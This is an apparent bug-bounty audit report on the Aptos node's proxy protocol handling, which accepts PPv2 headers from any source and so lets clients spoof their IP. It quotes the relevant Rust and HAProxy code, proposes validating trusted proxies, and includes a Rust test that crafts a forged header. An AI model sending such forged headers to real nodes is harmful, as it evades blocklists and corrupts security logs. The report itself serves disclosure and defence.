# Audit Report

## Title
Proxy Protocol Header Spoofing Enables IP-Based Access Control Bypass

## Summary
When proxy protocol is enabled (`enable_proxy_protocol: true`), the network transport layer accepts proxy protocol headers from any incoming connection without validating the source. An attacker who can reach the backend port directly (bypassing HAProxy) can send forged proxy protocol headers with arbitrary source IP addresses, bypassing HAProxy's IP blocklist filtering and poisoning security logs.

## Finding Description

The vulnerability exists in the proxy protocol implementation and its integration with the network transport layer: [1](#0-0) 

When an inbound connection is received with proxy protocol enabled, the code reads the proxy protocol header and extracts the source address without any validation: [2](#0-1) 

The TCP transport layer obtains the real source address from the OS TCP stack: [3](#0-2) 

However, when proxy protocol is enabled, this real address is **replaced** with whatever is in the proxy protocol header, without validating that the connection came from a trusted proxy.

**Attack Path:**

1. HAProxy is configured to perform IP blocklist filtering and forward connections with proxy protocol headers: [4](#0-3) [5](#0-4) 

2. The fullnode is configured to accept proxy protocol: [6](#0-5) 

3. If an attacker can bypass HAProxy and connect directly to the backend port (6182), they can:
   - Send a valid proxy protocol v2 header claiming any source IP
   - The node accepts this spoofed IP address
   - The attacker bypasses HAProxy's IP blocklist
   - Security logs show the spoofed IP instead of the real attacker IP

## Impact Explanation

This is a **High Severity** issue per Aptos bug bounty criteria as it constitutes a "Significant protocol violation" - specifically bypassing IP-based access control mechanisms.

**Primary Impact:**
- **Security Control Bypass**: HAProxy's IP blocklists (configured via `blocked.ips`) are bypassed when attackers can reach the backend directly

**Secondary Impact:**  
- **Log Poisoning**: Security monitoring and incident response logs show spoofed IPs, preventing accurate attribution
- **Monitoring Evasion**: Rate limiting and anomaly detection based on source IPs are evaded

**Scope:**
- Affects fullnodes with `enable_proxy_protocol: true`
- Requires network access to backend port (should be restricted by NetworkPolicy/firewalls)
- Validators have NetworkPolicy protection: [7](#0-6) 

However, the NetworkPolicy only covers validators, not fullnodes, creating an inconsistent security posture.

## Likelihood Explanation

**Likelihood: Medium**

The attack requires:
- Proxy protocol to be enabled (common in production deployments with HAProxy)
- Network access to backend port bypassing HAProxy (requires firewall misconfiguration or cloud security group misconfiguration)
- Knowledge that proxy protocol is enabled

**Mitigating Factors:**
- Properly configured Kubernetes NetworkPolicy restricts backend access
- Cloud firewalls/security groups should restrict backend ports
- The vulnerability is a defense-in-depth failure, not a direct exploit

**Aggravating Factors:**
- No code-level validation of trusted proxy sources
- Configuration complexity increases misconfiguration risk
- NetworkPolicy not consistently applied to all node types

## Recommendation

Implement trusted proxy source validation before accepting proxy protocol headers:

```rust
// In network/netcore/src/transport/proxy_protocol.rs
pub async fn read_header<T: AsyncRead + std::marker::Unpin>(
    original_addr: &NetworkAddress,
    stream: &mut T,
    trusted_proxy_addresses: &[IpAddr], // NEW: Add trusted proxy validation
) -> io::Result<NetworkAddress> {
    // Validate the connection came from a trusted proxy
    if !trusted_proxy_addresses.is_empty() {
        let peer_addr = extract_ip_from_network_address(original_addr)?;
        if !trusted_proxy_addresses.contains(&peer_addr) {
            return Err(io::Error::new(
                io::ErrorKind::PermissionDenied,
                "ProxyProtocol: Connection not from trusted proxy",
            ));
        }
    }
    
    // Existing proxy protocol parsing...
}
```

Add configuration option in `NetworkConfig`:
```rust
pub struct NetworkConfig {
    // ...
    pub enable_proxy_protocol: bool,
    pub trusted_proxy_addresses: Vec<IpAddr>, // NEW: List of trusted proxy IPs
    // ...
}
```

**Additional Recommendations:**
1. Ensure NetworkPolicy consistently applied to fullnodes
2. Document that backend ports must never be publicly accessible
3. Add monitoring alerts for proxy protocol connections from unexpected sources

## Proof of Concept

```rust
#[cfg(test)]
mod proxy_protocol_spoof_test {
    use super::*;
    use aptos_memsocket::MemorySocket;
    use futures::{executor::block_on, io::AsyncWriteExt};
    
    #[test]
    fn test_proxy_protocol_spoofing() {
        let (mut attacker_socket, mut server_socket) = MemorySocket::new_pair();
        let original_addr = NetworkAddress::from_str("/ip4/1.2.3.4/tcp/6182").unwrap();
        
        // Attacker sends proxy protocol header claiming to be from different IP
        let spoofed_attack = async move {
            // PPv2 signature
            attacker_socket.write_all(&[
                0x0D, 0x0A, 0x0D, 0x0A, 0x00, 0x0D, 0x0A, 0x51, 
                0x55, 0x49, 0x54, 0x0A
            ]).await.unwrap();
            
            // Version 2, PROXY command
            attacker_socket.write_all(&[0x21]).await.unwrap();
            
            // TCP over IPv4
            attacker_socket.write_all(&[0x11]).await.unwrap();
            
            // Address size (12 bytes for IPv4)
            attacker_socket.write_all(&[0x00, 0x0C]).await.unwrap();
            
            // Spoofed source IP: 5.6.7.8 (not the real attacker IP 1.2.3.4)
            attacker_socket.write_all(&[5, 6, 7, 8]).await.unwrap();
            
            // Destination IP
            attacker_socket.write_all(&[10, 0, 0, 1]).await.unwrap();
            
            // Source port and dest port
            attacker_socket.write_all(&[0x1F, 0x90, 0x1F, 0x90]).await.unwrap();
        };
        
        let read_header = async move {
            let result_addr = read_header(&original_addr, &mut server_socket).await.unwrap();
            
            // The server accepted the spoofed address!
            let addresses: Vec<_> = result_addr.to_socket_addrs().unwrap().collect();
            let socket_addr = addresses.first().unwrap();
            
            // Server believes connection is from 5.6.7.8, not 1.2.3.4
            assert_eq!(IpAddr::V4(Ipv4Addr::new(5, 6, 7, 8)), socket_addr.ip());
        };
        
        block_on(async {
            futures::join!(spoofed_attack, read_header);
        });
    }
}
```

This test demonstrates that an attacker can successfully inject a forged proxy protocol header claiming any source IP address, and the server will accept it without validation.

### Citations

**File:** network/netcore/src/transport/proxy_protocol.rs (L51-132)
```rust
pub async fn read_header<T: AsyncRead + std::marker::Unpin>(
    original_addr: &NetworkAddress,
    stream: &mut T,
) -> io::Result<NetworkAddress> {
    // This is small enough that it should not be fragmented by TCP
    let mut header = [0u8; 16];
    stream.read_exact(&mut header).await?;

    // If it's not proxy protocol, let's stop
    if header[0..12] != PPV2_SIGNATURE {
        return Err(io::Error::new(
            io::ErrorKind::InvalidInput,
            "ProxyProtocol: Invalid signature",
        ));
    }

    // High 4 bits is version, low 4 bits is command
    let version_and_command = header[12];
    match version_and_command {
        PPV2_LOCAL | PPV2_PROXY => (),
        _ => {
            return Err(io::Error::new(
                io::ErrorKind::InvalidInput,
                "ProxyProtocol: Unsupported command or protocol version",
            ));
        },
    };

    // High 4 bits is family, low 4 bits is protocol
    let family_and_protocol = header[13];
    let address_size: [u8; 2] = header[14..16].try_into().unwrap();
    let address_size = u16::from_be_bytes(address_size);

    let mut address_bytes: Vec<u8> = vec![0; address_size as usize];
    stream.read_exact(&mut address_bytes).await?;

    let source_address = match family_and_protocol {
        // TODO: Support UDP in the future
        LOCAL_PROTOCOL | UDP_IPV4 | UDP_IPV6 | TCP_UNIX | UDP_UNIX => {
            // UNSPEC, UDP, and UNIX Steam/datagram
            // Accept connection but ignore address info as per spec
            original_addr.clone()
        },
        TCP_IPV4 => {
            // This is not mentioned in the spec, but if it doesn't match we might not read correctly
            if address_size < IPV4_SIZE {
                return Err(io::Error::new(
                    io::ErrorKind::InvalidInput,
                    "ProxyProtocol: Header size doesn't match expected address type",
                ));
            }

            let src_addr = u32::from_be_bytes(address_bytes[0..4].try_into().unwrap());
            let src_port = u16::from_be_bytes(address_bytes[8..10].try_into().unwrap());
            let socket_addr = SocketAddr::new(IpAddr::V4(Ipv4Addr::from(src_addr)), src_port);
            NetworkAddress::from(socket_addr)
        },
        TCP_IPV6 => {
            // This is not mentioned in the spec, but if it doesn't match we might not read correctly
            if address_size < IPV6_SIZE {
                return Err(io::Error::new(
                    io::ErrorKind::InvalidInput,
                    "ProxyProtocol: Header size doesn't match expected address type",
                ));
            }

            let src_addr = u128::from_be_bytes(address_bytes[0..16].try_into().unwrap());
            let src_port = u16::from_be_bytes(address_bytes[32..34].try_into().unwrap());

            let socket_addr = SocketAddr::new(IpAddr::V6(Ipv6Addr::from(src_addr)), src_port);
            NetworkAddress::from(socket_addr)
        },
        _ => {
            return Err(io::Error::new(
                io::ErrorKind::InvalidInput,
                "ProxyProtocol: Unsupported Address Family or Protocol",
            ));
        },
    };

    Ok(source_address)
}
```

**File:** network/framework/src/transport/mod.rs (L260-274)
```rust
    let addr = if proxy_protocol_enabled {
        proxy_protocol::read_header(&addr, &mut socket)
            .await
            .map_err(|err| {
                debug!(
                    network_address = addr,
                    error = %err,
                    "ProxyProtocol: Failed to read header: {}",
                    err
                );
                err
            })?
    } else {
        addr
    };
```

**File:** network/netcore/src/transport/tcp.rs (L319-334)
```rust
    fn poll_next(self: Pin<&mut Self>, context: &mut Context) -> Poll<Option<Self::Item>> {
        match self.inner.poll_accept(context) {
            Poll::Ready(Ok((socket, addr))) => {
                if let Err(e) = self.config.apply_config(&socket) {
                    return Poll::Ready(Some(Err(e)));
                }
                let dialer_addr = NetworkAddress::from(addr);
                Poll::Ready(Some(Ok((
                    future::ready(Ok(TcpSocket::new(socket))),
                    dialer_addr,
                ))))
            },
            Poll::Ready(Err(e)) => Poll::Ready(Some(Err(e))),
            Poll::Pending => Poll::Pending,
        }
    }
```

**File:** terraform/helm/aptos-node/files/haproxy.cfg (L45-46)
```text
    # Deny requests from blocked IPs
    tcp-request connection silent-drop if { src -n -f /usr/local/etc/haproxy/blocked.ips }
```

**File:** terraform/helm/aptos-node/files/haproxy.cfg (L161-162)
```text
    default-server maxconn {{ $.Values.fullnode.config.max_inbound_connections }} {{ if $.Values.haproxy.config.send_proxy_protocol }}send-proxy-v2{{ end }}
    server {{ include "aptos-validator.fullname" $ }}-{{ $.Values.i }}-{{ $config.name }} {{ include "aptos-validator.fullname" $ }}-{{ $.Values.i }}-{{ $config.name }}:6182
```

**File:** terraform/helm/aptos-node/files/configs/fullnode-base.yaml (L26-26)
```yaml
  enable_proxy_protocol: {{ $.Values.haproxy.config.send_proxy_protocol }}
```

**File:** terraform/helm/aptos-node/templates/networkpolicy.yaml (L20-30)
```yaml
  # HAproxy
  - from:
    - podSelector:
        matchLabels:
          {{- include "aptos-validator.selectorLabels" $ | nindent 10 }}
          app.kubernetes.io/name: haproxy
          app.kubernetes.io/instance: haproxy-{{$i}}
    ports:
      # AptosNet from HAproxy
    - protocol: TCP
      port: 6180
```
